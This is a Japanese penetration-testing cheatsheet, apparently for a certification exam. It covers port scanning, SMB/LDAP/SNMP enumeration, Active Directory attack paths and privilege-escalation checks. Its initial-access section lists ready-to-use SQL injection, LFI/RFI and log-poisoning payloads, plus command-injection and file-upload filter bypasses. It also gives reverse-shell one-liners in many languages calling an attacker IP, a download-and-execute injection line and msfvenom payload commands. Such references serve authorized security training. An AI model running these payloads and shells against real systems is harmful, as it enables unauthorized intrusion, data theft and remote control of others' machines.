# Cheatsheet

## 📌 変数定義・共通環境設定 (Global Environment Setup)

ターミナル起動時に環境変数を設定しておくことで、以降のコマンドをコピー＆ペーストでそのまま実行可能になります。

```bash
# ==========================================
# ターゲット・攻撃機 基本環境変数設定
# ==========================================
export TARGET_IP="10.10.10.123"
export ATTACKER_IP="10.10.14.5"
export DOMAIN="corp.local"
export DC_IP="10.10.10.10"
export DC_HOSTNAME="DC01"
export WORDLIST="/usr/share/wordlists/rockyou.txt"
export SECLISTS="/usr/share/seclists"

# 接続プロキシ設定 (Proxychains / Burp Suite)
export BURP_PROXY="127.0.0.1:8080"
export SOCKS_PROXY="127.0.0.1:1080"

# 設定確認ワンライナー
echo -e "\n[+] Current Environment Variables:\nTarget IP  : $TARGET_IP\nAttacker IP: $ATTACKER_IP\nDomain     : $DOMAIN\nDC IP      : $DC_IP\n"

# 作業用ディレクトリ構造の自動生成
mkdir -p ./nmap ./web ./smb ./credentials ./exploits ./loot

# 便利なエイリアス設定 (必要に応じて ~/.bashrc に追加)
alias nmap-fast="nmap -p- --min-rate 5000 -sS -n -Pn"
alias pyhttp="python3 -m http.server 80"
alias nc-listen="nc -lvnp 4444"
```

# ターミナルセッションログの自動記録開始 (エビデンス保護)
```
script -a -f session_$(date +%Y%m%d_%H%M%S).log
```

> [!TIP] ターミナルログ記録の重要性
> `script -a` コマンドで作業ログを常時記録しておくことで、試験後のレポート作成時に「実行したコマンドの正確な入力値と出力結果」をそのまま証拠として使用できます。

---

## 1. 偵察・サービス詳細調査 (Reconnaissance & Enumeration)

### 🧭 ポートスキャン結果の診断・深掘り判断フロー (Decision Tree)

ポートスキャンの結果を得た後、**どこから着手し、何をどのような優先度で深掘りすべきか**の意志決定ガイドラインです。無駄なラビットホール（時間泥棒な罠）を回避するために必ず確認してください。

```text
[ポートスキャン完了]
  │
  ├─► [80, 443, 8080, 8443, 8000, 5000 (Webサービス) が開いている] ───【優先度: 最高 ★★★★★】
  │     ├─ 1. ブラウザでアクセス（ソースコード表示、コメント、Cookie, HTTPレスポンスヘッダー確認）
  │     ├─ 2. Webサーバーの種類/バージョン・CMSの特定（WhatWeb, Wafw00f, cURL -I）
  │     ├─ 3. ディレクトリ/ファイル探索（ffuf: .php, .txt, .html, .xml, .bak, .json, .config, .zip）
  │     ├─ 4. VHost / サブドメイン探索（Host: FUZZ.domain.local）
  │     ├─ 5. WebDAVの確認（davtest / cadaver / curl OPTIONS）
  │     └─ 6. CMS専用スキャナー実行（WPScan, Droopescan, Joomscan）
  │
  ├─► [445, 139 (SMB) / 389, 636 (LDAP) / 135 (RPC) が開いている] ───【優先度: 最高 ★★★★★】
  │     ├─ 1. Netexec (nxc) でゲスト / Null Session 探索 (`nxc smb $TARGET_IP -u '' -p '' --shares`)
  │     ├─ 2. enum4linux-ng による自動一括列挙 (`enum4linux-ng -A $TARGET_IP`)
  │     ├─ 3. rpcclient で匿名接続 (`rpcclient -U "" -N $TARGET_IP` -> `enumdomusers`, `querydispinfo`)
  │     ├─ 4. ldapsearch で RootDSE と Base DN の特定、および匿名オブジェクト抽出
  │     └─ 5. smbclient で公開共有フォルダの全ファイルを一括ダウンロード (`mget *`)
  │
  ├─► TCP 88 (Kerberos 発見 -> 完全な AD 環境)
  │     └─► 5. Active Directory 攻略フローへ進む  
  │
  ├─► [1433 (MSSQL) / 3306 (MySQL) / 5432 (PostgreSQL) が開いている] ───【優先度: 高 ★★★★☆】
  │     ├─ 1. Netexec でデフォルトアカウント（sa, root, postgres）または空パスワード試行
  │     ├─ 2. mssqlclient.py や sqsh で接続し、`xp_cmdshell` の実行可能性を確認
  │     └─ 3. Web側のSQLiや設定ファイル経由でパスワードが入手できるか並行調査
  │
  ├─► [53 (DNS) が開いている] ───【優先度: 高 ★★★★☆】
  │     ├─ 1. Zone Transfer (AXFR) の試行 (`dig axfr @$TARGET_IP $DOMAIN`)
  │     └─ 2. 逆引きDNS検索およびホスト名の特定
  │
  ├─► [21 (FTP) / 23 (Telnet) / 25 (SMTP) / 161 (SNMP) が開いている] ───【優先度: 中 ★★★☆☆】
  │     ├─ FTP : 匿名ログイン (`anonymous` / `anonymous`) およびパッシブモードでのファイル全ダウンロード
  │     ├─ SMTP: ユーザー名の検証 (`smtp-user-enum`, `VRFY`, `EXPN`, `RCPT TO`)
  │     └─ SNMP: コミュニティ名のスプレー (`onesixtyone`, `snmpwalk -v2c -c public`)
  │
  └─► [22 (SSH) / 3389 (RDP) / 5985 (WinRM) のみが開いている] ───【優先度: 低 ★★☆☆☆ (初期ラビットホール注意)】
        ├─ ⚠ SSH/RDPブルートフォースから始めるのは原則禁止（時間の無駄になる確率90%以上）
        └─ 外部サービスやWeb/SMBで入手した認証情報（ユーザー名/パスワード/ハッシュ）を試す場所として保持
```

### Active Directory 攻略ルート選定ツリー

```text
[ AD 攻撃フェーズ判定 ]
 │
 ├── 1. 未認証・アクセス資格情報なし (Unauthenticated / Foothold Phase)
 │    ├── SMB / RPC Null Session・Guest探索 ──> (nxc smb / rpcclient / enum4linux-ng)
 │    ├── LDAP 匿名バインド ──> (ldapsearch / nxc ldap)
 │    ├── ユーザー名列挙 & AS-REP Roasting ──> (kerbrute / GetNPUsers.py)
 │    └── Web / 外部共有のクレデンシャル探索 ──> (LFI, GPP, 露出ファイル)
 │
 ├── 2. ドメイン一般ユーザー権限獲得 (Domain Authenticated User)
 │    ├── ドメイン詳細列挙 ──> (PowerView / BloodHound / nxc)
 │    ├── Kerberoasting (SPNアカウント探査) ──> (GetUserSPNs.py / Rubeus)
 │    ├── 共有フォルダ・GPOパスワード探索 ──> (SYSVOL, NETLOGON, GPP)
 │    ├── ADCS (証明書サービス) 脆弱性調査 ──> (Certify / Certipy)
 │    └── 委任設定 (Delegation) の確認 ──> (Unconstrained / Constrained / RBCD)
 │
 └── 3. ドメインローカル管理者 / Domain Admin 権限獲得 (Privileged Access)
      ├── メモリドメイン認証情報ダンプ ──> (Mimikatz sekurlsa / lsass)
      ├── DCSync 攻撃 (全ハッシュ抽出) ──> (secretsdump.py / lsadump::dcsync)
      ├── Golden Ticket / Silver Ticket 偽造 ──> (ticketer.py / Rubeus)
      └── ドメイン全体への横展開 ──> (wmiexec / psexec / evil-winrm)
```

### 権限昇格 (Privilege Escalation) 判定フロー

```text
[初期シェル取得 (Foothold)]
   │
   ├─► 【Linux 環境】
   │     ├─► sudo -l (パスワードなしで実行可能なコマンドの有無 ➔ GTFOBins)
   │     ├─► SUID/SGID バイナリ検索 (find / -perm -4000 2>/dev/null ➔ GTFOBins)
   │     ├─► Capabilities 確認 (getcap -r / 2>/dev/null)
   │     ├─► Cron ジョブ & 実行スクリプトの書き込み権限確認 (/etc/crontab)
   │     ├─► 内部リッスンポート確認 (netstat -tuln ➔ ローカルポート転送)
   │     └─► linPEAS 自動スキャン実行
   │
   └─► 【Windows 環境】
         ├─► whoami /priv (SeImpersonatePrivilege / SeAssignPrimaryToken ➔ PrintSpoofer / RoguePotato)
         ├─► cmdkey /list (保存済み資格情報の有無 ➔ runas /savecred)
         ├─► 不適切な権限のサービス & Unquoted Service Paths (sc query, wmic)
         ├─► AlwaysInstallElevated レジストリ確認 (0x1 ➔ MSIペイロード実行)
         ├─► PowerShell 履歴・設定ファイル検索 (ConsoleHost_history.txt, Unattend.xml)
         └─► winPEAS.exe 自動スキャン実行
```

#### 🚨 ラビットホール（時間泥棒）回避の鉄則ルール
1. **SSH (22) への辞書攻撃を最初にやらない**: 認証情報が何も無い状態で SSH に対して Hydra などを回すのは極めて効率が悪いです。WebやSMBから資格情報を入手してからアクセスしてください。
2. **Webのデフォルトページで固まらない**: Apache/Nginxの初期画面が出ても諦めず、必ず `ffuf` でディレクトリ探索と `Host` ヘッダーによる VHost スキャンを行ってください。
3. **UDPスキャンを放置しない**: TCPで手がかりが無い場合は、必ず UDP 上位ポート（SNMP 161, TFTP 69, DNS 53, NetBIOS 137）をスキャンしてください。

---

### 1.1 ネットワーク・ポートスキャン (Port Scanning)

```bash
# Nmap: 全TCPポート高速スキャン（開放ポートの抽出）
nmap -p- --min-rate 5000 -sS -n -Pn $TARGET_IP -oN nmap_all_ports.txt

# Nmap: 開放ポートを自動抽出して詳細スクリプト・サービスバージョン判定を実行
PORTS=$(grep -E '^[0-9]+/(tcp|udp)' nmap_all_ports.txt | cut -d'/' -f1 | tr '\n' ',' | sed 's/,$//')
nmap -sC -sV -p$PORTS $TARGET_IP -oN nmap_detailed.txt

# Nmap: UDP上位100ポートの集中スキャン
nmap -sU --top-ports 100 -sV -n -Pn $TARGET_IP -oN nmap_udp.txt

# Nmap: 脆弱性検出スクリプト (vuln) の実行
nmap --script vuln -p$PORTS $TARGET_IP -oN nmap_vuln.txt

# Nmap: 特定サービスのNSEカテゴリー実行 (例: auth, discovery, default)
nmap --script "auth,discovery" -p 80,445,389 $TARGET_IP -oN nmap_discovery.txt

# Rustscan: 高速ポート発見からNmapへの自動パイプライン
rustscan -a $TARGET_IP --ulimit 5000 -- -sC -sV -oN rustscan_out.txt

# Masscan: 大規模ネットワークIP範囲の全ポート高速スキャン
masscan -p1-65535 $TARGET_IP --rate 10000 -e eth0 -oG masscan_out.txt

# Naabu: ポートスキャナー (Go言語製・高速)
naabu -host $TARGET_IP -p - -rate 3000

# Subnet Ping Sweep: サブネット上の生存ホスト一括探索
fping -g 10.10.10.0/24 -a 2>/dev/null
nmap -sn 10.10.10.0/24 -oG - | awk '/Up$/{print $2}'

# Netexec (nxc): サブネット全ホストに対するSMB応答・OSバージョン一括識別
nxc smb 10.10.10.0/24 --gen-relay-list targets_no_sing.txt
```

> [!NOTE] ポートスキャン結果の評価ルール
> 1. **Web (80/443/8080/8443)** があれば最優先で調査。
> 2. **SMB (139/445)** や **RPC (135)** が開いていれば、認証なしアクセスを即座に確認。
> 3. **Kerberos (88) / LDAP (389)** が見つかれば、ターゲットは Active Directory ドメインコントローラー。
> 4. **SSH (22) や RDP (3389)** 単体では攻撃せず、他のサービスで資格情報を入手した後のログイン先として残す。

---

### 1.2 Webサービス調査 (Directory, File, VHost & WebDAV)

```bash
# ffuf: 基本的なディレクトリ＆ファイル拡張子探索
ffuf -u http://$TARGET_IP/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.txt,.html,.bak,.json,.config,.zip,.tar.gz -ic -c

# ffuf: 大規模単語リストによる深度探索
ffuf -u http://$TARGET_IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -e .php,.txt,.html,.json -ic -c -fc 404

# ffuf: 再帰的ディレクトリ探索 (Depth 2)
ffuf -u http://$TARGET_IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -recursion -recursion-depth 2 -e .php,.html -ic

# ffuf: 仮想ホスト (VHost) / サブドメインの列挙 (サイズフィルター指定)
ffuf -u http://$TARGET_IP/ -H "Host: FUZZ.$DOMAIN" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 15495

# ffuf: POSTパラメータのパラメータマイニング (Fuzzing)
ffuf -u http://$TARGET_IP/index.php -X POST -d "FUZZ=test" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 1234

# Gobuster: ディレクトリ列挙 (ステータスコード指定)
gobuster dir -u http://$TARGET_IP/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,json -t 40 -s "200,204,301,302,307,401,403"

# Gobuster: ディレクトリ列挙 (再帰的)
gobuster dir -u http://$TARGET_IP/data -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,json -t 40 -s "200,204,301,302,307,401,403" -r

# Gobuster: DNSサブドメインブルートフォース
gobuster dns -d $DOMAIN -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -i

# Feroxbuster: 高速・再帰的Webスキャン
feroxbuster -u http://$TARGET_IP/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt -t 50 -k

# Dirsearch: 伝統的なPython製ディレクトリディガー
dirsearch -u http://$TARGET_IP/ -e php,html,js,json,txt,zip -E

# WebDAV: davtestによる自動テスト＆実行権限検証
davtest -url http://$TARGET_IP/webdav/

# WebDAV: cadaverによる対話的WebDAV接続
cadaver http://$TARGET_IP/webdav/

# cURL: Webサーバーレスポンスヘッダーおよび許可HTTPメソッドの確認
curl -i -X OPTIONS http://$TARGET_IP/
curl -I http://$TARGET_IP/
curl -s -D - http://$TARGET_IP/ -o /dev/null

# WhatWeb: Webテクノロジー・CMSスタックの特定
whatweb -a 3 http://$TARGET_IP/

# Wafw00f: WAF (Web Application Firewall) の自動検出
wafw00f http://$TARGET_IP/

# WPScan: WordPress専用スキャナー (プラグイン脆弱性・ユーザー列挙)
wpscan --url http://$TARGET_IP/ --enumerate u,p,t --plugins-detection aggressive

# Droopescan: Drupal / SilverStripe / Joomla / Moodle スキャナー
droopescan scan drupal -u http://$TARGET_IP/

# Nikto: Webサーバー総合脆弱性スキャン
nikto -h http://$TARGET_IP/ -ssl
```

---

### 1.3 特定プロトコル詳細列挙

#### SMB / RPC (139, 445)
```bash
# Netexec (nxc): SMB共有・アクセス権限（Read/Write）の列挙
nxc smb $TARGET_IP -u 'guest' -p '' --shares
nxc smb $TARGET_IP -u '' -p '' --pass-pol
nxc smb $TARGET_IP -u '' -p '' --users
nxc smb $TARGET_IP -u '' -p '' --groups

# enum4linux-ng: 包括的SMB/RPC詳細列挙（ユーザー、グループ、共有、ポリシー）
enum4linux-ng -A $TARGET_IP

# smbclient: 匿名/Nullセッションでの共有リスト取得
smbclient -L \\\\$TARGET_IP\\ -N

# smbclient: 特定共有へのアクセスと全ファイル再帰ダウンロード
smbclient \\\\$TARGET_IP\\ShareName -N -c "prompt OFF; recurse ON; mget *"

# smbmap: 共有フォルダパーミッションの一括可視化
smbmap -H $TARGET_IP
smbmap -H $TARGET_IP -u 'guest' -p ''

# rpcclient: 匿名接続でのドメイン情報・ユーザー一覧・RIDサイクル列挙
rpcclient -U "" -N $TARGET_IP -c "srvinfo; enumdomusers; querydispinfo; lsaquery"
# rpcclient 主要コマンド集
# - enumdomusers : ドメインユーザー一覧
# - enumdomgroups : ドメイングループ一覧
# - queryuser <RID> : 指定RIDのユーザー詳細
# - querygroupmem <RID> : 指定グループのメンバー一覧
# - netshareenumall : 全共有名の列挙

# RIDサイクリング (ユーザーRID 1000〜1150の強制検索)
for i in $(seq 1000 1150); do rpcclient -U "" -N $TARGET_IP -c "queryuser $i" 2>/dev/null | grep "User Name" && echo "RID: $i"; done
```

#### LDAP (389, 636)
```bash
# Netexec: LDAP匿名アクセスによるユーザー一覧抽出
nxc ldap $TARGET_IP -u '' -p '' --users
nxc ldap $TARGET_IP -u '' -p '' --asreproast asrep_targets.txt

# ldapsearch: Naming Contexts (Base DN) の特定
ldapsearch -H ldap://$TARGET_IP -x -s base namingContexts

# ldapsearch: 全ユーザーオブジェクトおよび説明属性 (description) の抽出
ldapsearch -H ldap://$TARGET_IP -x -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName description userAccountControl

# ldapsearch: 特定属性（SPN等）を持つユーザーの抽出
ldapsearch -H ldap://$TARGET_IP -x -b "DC=corp,DC=local" "(servicePrincipalName=*)" sAMAccountName servicePrincipalName

# windapsearch: LDAPドメイン列挙自動化ツール
windapsearch -m users --instance $TARGET_IP
windapsearch -m computers --instance $TARGET_IP
windapsearch -m groups --instance $TARGET_IP
```

#### SNMP (161/UDP)
```bash
# onesixtyone: コミュニティ名の高速スプレー
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $TARGET_IP

# snmpwalk: publicコミュニティ名での全OIDウォーク
snmpwalk -v2c -c public $TARGET_IP .

# snmpwalk: 実行中プロセス一覧およびインストール済みソフトの抽出
snmpwalk -v2c -c public $TARGET_IP 1.3.6.1.2.1.25.4.2.1.2  # 実行中プロセス
snmpwalk -v2c -c public $TARGET_IP 1.3.6.1.2.1.25.6.3.1.2  # インストール済みソフト
snmpwalk -v2c -c public $TARGET_IP 1.3.6.1.2.1.2.2.1.6     # MACアドレス / ネットワークIF
snmpwalk -v2c -c public $TARGET_IP 1.3.6.1.4.1.77.1.2.25   # システムユーザー一覧

# snmp-check: SNMP情報のフォーマット化出力
snmp-check $TARGET_IP -c public
```

#### FTP (21) & SSH (22) & SMTP (25) & DNS (53) & MSSQL (1433)
```bash
# FTP: 匿名ログインおよびパッシブモードでのファイル全取得
ftp -n $TARGET_IP <<EOF
user anonymous anonymous
binary
passive
prompt off
mget *
quit
EOF

# SSH: サポートされている暗号化アルゴリズム・バナーの確認
ssh -v user@$TARGET_IP
ssh-audit $TARGET_IP

# DNS: ゾーン転送 (AXFR) 試行
dig axfr @$TARGET_IP $DOMAIN
nslookup -type=any $DOMAIN $TARGET_IP

# SMTP: ユーザー名の検証 (VRFY / EXPN / RCPT TO)
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames.txt -t $TARGET_IP
smtp-user-enum -M RCPT -U /usr/share/seclists/Usernames/top-usernames.txt -t $TARGET_IP

# MSSQL: Netexecによるデフォルト・空パスワード認証検証
nxc mssql $TARGET_IP -u 'sa' -p ''
nxc mssql $TARGET_IP -u 'sa' -p 'sa' --loggedon-users
nxc mssql $TARGET_IP -u 'sa' -p 'password' -M eazy_install -x 'whoami'
```

---

### 🛠 【1.4 偵察・詳細調査フェーズのトラブルシューティング・チェックリスト】

- [ ] **全TCPポートスキャン (`-p-`) を実行したか？**  
  標準の1000ポートに含まれない非標準ポート（例: 8000, 8080, 8443, 8888, 9001, 3128, 10000）に重要なWebサービスやAPIが隠れているケースが多発します。
- [ ] **Webディレクトリ探索で拡張子 (`-e .php,.txt,.html,.bak,.config,.json,.zip`) を指定したか？**  
  単なるフォルダ名だけでなく、`config.php.bak` や `db.json` や `notes.txt` など拡張子付きの隠しファイルにパスワードが書かれていることがあります。
- [ ] **VHost / サブドメイン探索を実行したか？**  
  IPアドレス直接アクセスと `Host: admin.target.local` などのヘッダー経由アクセスで表示されるWebページが異なるか確認しましたか？
- [ ] **SMB共有に Guest または Null セッション（`-N`）で接続できるか確認したか。**
- [ ] **SMB / RPC で RID サイクリングを実施したか？**  
  `enumdomusers` で返ってこない場合でも、`rpcclient` の `queryuser <RID>` (1000〜1150) で隠れたユーザー名がヒットすることがあります。
- [ ] **UDPスキャン (SNMP 161, TFTP 69, DNS 53) を確認したか？**  
  TCPで何も得られない場合、SNMP コミュニティ名 `public` や `private` からシステム情報・プロセス一覧・ネットワーク構成が漏洩していないか確認してください。
- [ ] **WebDAVの書き込みテストを実施したか？**  
  `davtest` や `curl -X OPTIONS` で `PUT` や `MOVE` メソッドが許可されているか確認しましたか？
- [ ] **RPC（`rpcclient`）で `enumdomusers` や `querydispinfo` を実行して説明欄（description）を確認したか？**
- [ ] **LDAP（`ldapsearch`）で匿名アクセスを試行したか？**

---

## 2. 初期侵入 (Initial Access & Foothold)

---

### 2.1 Webアプリケーション攻撃パターン & ペイロード

#### SQL Injection (SQLi)
```bash
# sqlmap: GETパラメータに対する自動検出・データベース列挙
sqlmap -u "http://$TARGET_IP/page.php?id=1" --batch --dbs

# sqlmap: テーブル・カラム・データの完全ダンプ
sqlmap -u "http://$TARGET_IP/page.php?id=1" -D target_db --tables --dump

# sqlmap: POSTリクエストファイル（Burp保存）を使用した攻撃＆OSシェル試行
sqlmap -r req.txt --batch --os-shell

# sqlmap: WAFバイパス用タンプラスクリプトの適用
sqlmap -u "http://$TARGET_IP/page.php?id=1" --tamper=space2comment,between,charencode --batch

# 手動SQLi確認用ペイロード
' OR 1=1-- -
' UNION SELECT NULL, version(), user()-- -
' UNION SELECT NULL, table_name, column_name FROM information_schema.columns-- -
' UNION SELECT NULL, username, password FROM users-- -
admin' -- -
admin' #
' AND 1=1-- -
' AND 1=2-- -
' AND SLEEP(5)-- -
```

#### Local File Inclusion (LFI) & Remote File Inclusion (RFI)
```bash
# LFI 基本パターン
http://$TARGET_IP/index.php?page=../../../../etc/passwd
http://$TARGET_IP/index.php?page=../../../../boot.ini
http://$TARGET_IP/index.php?page=../../../../windows/win.ini
http://$TARGET_IP/index.php?page=..\..\..\..\windows\system32\drivers\etc\hosts

# LFI ヌルバイト・ダブルエンコーディングによるバイパス
http://$TARGET_IP/index.php?page=../../../../etc/passwd%00
http://$TARGET_IP/index.php?page=%252e%252e%252f%252e%252e%252fetc%252fpasswd
http://$TARGET_IP/index.php?page=....//....//....//etc/passwd

# PHP Wrapper によるソースコード読み込み (Base64エンコード)
http://$TARGET_IP/index.php?page=php://filter/convert.base64-encode/resource=config.php
http://$TARGET_IP/index.php?page=php://filter/convert.base64-encode/resource=index.php

# PHP Data Wrapper による直接コード実行
http://$TARGET_IP/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+&cmd=whoami

# PHP Expect Wrapper によるコマンド実行 (allow_url_include=On の場合)
http://$TARGET_IP/index.php?page=expect://whoami

# PHP Input Wrapper によるRCE (POSTデータにコードを渡す)
http://$TARGET_IP/index.php?page=php://input
# POST Body: <?php system('id'); ?>

# RFI (Remote File Inclusion)
http://$TARGET_IP/index.php?page=http://$ATTACKER_IP/shell.txt&cmd=id

# Apache / Nginx ログ毒入れ (Log Poisoning)
# 1. User-Agent ヘッダーにペイロードを仕込んでアクセス: <?php system($_GET['cmd']); ?>
# 2. LFIでアクセスログを呼び出し:
http://$TARGET_IP/index.php?page=../../../../var/log/apache2/access.log&cmd=id
http://$TARGET_IP/index.php?page=../../../../var/log/nginx/access.log&cmd=id

# SSH 認証ログ毒入れ (/var/log/auth.log)
# 1. SSHでログイン試行: ssh '<?php system($_GET["cmd"]); ?>'@$TARGET_IP
# 2. LFIで呼び出し:
http://$TARGET_IP/index.php?page=../../../../var/log/auth.log&cmd=id
```

#### Command Injection 手動回避テクニック
```bash
# コマンドインジェクション確認用パラメータ
127.0.0.1; whoami
127.0.0.1 | id
$(whoami)
`id`
127.0.0.1%0awhoami
127.0.0.1; wget http://$ATTACKER_IP/shell.sh -O /tmp/shell.sh; bash /tmp/shell.sh

# スペース回避技法 (Linux)
127.0.0.1;cat$IFS/etc/passwd
127.0.0.1;{cat,/etc/passwd}
127.0.0.1;cat</etc/passwd
127.0.0.1;X=$'cat\x20/etc/passwd';$X

# ファイルアップロードのバイパス手法
# 1. ダブル拡張子: shell.php.jpg / shell.php.png / shell.php.gif
# 2. 大文字小文字混在: shell.PhP / shell.pHP5 / shell.PhP7
# 3. ヌルバイトインジェクション: shell.php%00.jpg / shell.php\x00.png
# 4. MIMEタイプ偽装: Content-Type: image/jpeg
# 5. マジックバイト付与: ファイル先頭に GIF89a; を記述
# 6. .htaccess によるPHP実行許可の適用:
#    .htaccess 内に記載: AddType application/x-httpd-php .custom
#    その後に shell.custom をアップロード

# 単語フィルター（cat, whoami等）の回避
127.0.0.1;w'h'o'a'm'i
127.0.0.1;w"h"o"a"m"i
127.0.0.1;w\h\o\a\m\i
127.0.0.1;$(rev<<<imawoh)

# 改行記号によるコマンド実行
127.0.0.1%0awhoami
```

#### HTTP 403 Forbidden 回避ヘッダー
Burp Suiteのリクエストに以下のヘッダーを追加して制限をバイパス：
```http
X-Forwarded-For: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
X-Original-URL: /admin
X-Rewrite-URL: /admin
```

#### ファイルアップロード 拡張子 & 内容バイパス
```bash
# 拡張子のダブル/代替拡張子テクニック
shell.php.png
shell.php5
shell.phtml
shell.phar
shell.php.jpeg
shell.PHP

# NULLバイト注入 (古いPHP 5.x向け)
shell.php%00.png

# Apache .htaccess の書き換え (任意の拡張子をPHPとして実行させる)
# .htaccess ファイルとして以下をアップロード:
AddType application/x-httpd-php .png

# マジックバイトの偽装 (画像ヘッダーの追加)
GIF89a;
<?php system($_GET['cmd']); ?>
```

---

### 2.2 リバースシェル・ワンライナー (Reverse Shells)

```bash
# Bash (TCP)
bash -i >& /dev/tcp/$ATTACKER_IP/4444 0>&1
bash -c 'bash -i >& /dev/tcp/$ATTACKER_IP/4444 0>&1'
0<&196;exec 196<>/dev/tcp/$ATTACKER_IP/4444; sh <&196 >&196 2>&196

# Zsh / Sh
zsh -c 'zmodload zsh/net/tcp && ztcp $ATTACKER_IP 4444 && zsh <&$REPLY >&$REPLY 2>&$REPLY'
/bin/sh -i >& /dev/tcp/$ATTACKER_IP/4444 0>&1

# Python3
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ATTACKER_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'

# Python2
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ATTACKER_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/sh")'

# PHP
php -r '$sock=fsockopen("$ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("$ATTACKER_IP",4444);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'

# Perl
perl -e 'use Socket;$i="$ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Ruby
ruby -rsocket -e'f=TCPSocket.open("$ATTACKER_IP",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# Netcat (OpenBSD / traditional / Busybox)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ATTACKER_IP 4444 >/tmp/f
nc -e /bin/bash $ATTACKER_IP 4444
nc.traditional -e /bin/sh $ATTACKER_IP 4444

# Socat
socat TCP:$ATTACKER_IP:4444 EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane

# PowerShell (Base64 Encoded One-Liner)
# 作成コマンド:
# $code = '{ $client = New-Object System.Net.Sockets.TCPClient("10.10.14.5",4444); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + "PS " + (pwd).Path + "> "; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}; $client.Close() }'
# $bytes = [System.Text.Encoding]::Unicode.GetBytes($code)
# [Convert]::ToBase64String($bytes)
powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAA...
```

#### 2.3 TTY Spawn バリエーション (Pythonが入っていない環境向け)
```bash
# 1. Python 経由
python3 -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/sh")'

# 2. Script 経由 (PythonがないLinuxで極めて有効)
script /dev/null -c bash
script -qc /bin/bash /dev/null

# 3. Perl 経由
perl -e 'exec "/bin/sh";'
perl: exec "/bin/sh";

# 4. Ruby 経由
ruby -e 'exec "/bin/sh"'

# 5. Lua 経由
lua -e 'os.execute("/bin/sh")'

# 6. AWK 経由
awk 'BEGIN {system("/bin/sh")}'

# 7. TTY完全化のステップ (Ctrl+Z からの復帰)
# 1) シェル内で上記のいずれかを実行
# 2) Ctrl + Z でバックグラウンドに退避
# 3) 攻撃機端末で: stty raw -echo; fg
# 4) 攻撃機端末で: export TERM=xterm; stty rows 38 cols 160
```


#### 2.4. Socat 暗号化 TTY シェル
```bash
# 攻撃機: 証明書作成とリスナー起動
openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 365 -out shell.crt
cat shell.key shell.crt > shell.pem
socat OPENSSL-LISTEN:4443,cert=shell.pem,verify=0 FILE:`tty`,raw,echo=0

# ターゲット機: 接続開始
socat OPENSSL:$ATTACKER_IP:4443,verify=0 EXEC:"bash -li",pty,stderr,sigint,sigterm,sane
```

---

### 2.5 ペイロード生成 (`msfvenom` 完全リファレンス)

```bash
# Linux x86/x64 ELF
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$ATTACKER_IP LPORT=4444 -f elf -o reverse.elf
msfvenom -p linux/x86/shell_reverse_tcp LHOST=$ATTACKER_IP LPORT=4444 -f elf -o reverse32.elf

# Windows x86/x64 EXE
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ATTACKER_IP LPORT=4444 -f exe -o reverse.exe
msfvenom -p windows/shell_reverse_tcp LHOST=$ATTACKER_IP LPORT=4444 -f exe -o reverse32.exe

# Windows DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ATTACKER_IP LPORT=4444 -f dll -o reverse.dll

# Windows MSI (Installer)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ATTACKER_IP LPORT=4444 -f msi -o reverse.msi

# Web Payloads (PHP, ASP, ASPX, JSP, WAR)
msfvenom -p php/reverse_php LHOST=$ATTACKER_IP LPORT=4444 -f raw -o shell.php
msfvenom -p windows/shell_reverse_tcp LHOST=$ATTACKER_IP LPORT=4444 -f asp -o shell.asp
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ATTACKER_IP LPORT=4444 -f aspx -o shell.aspx
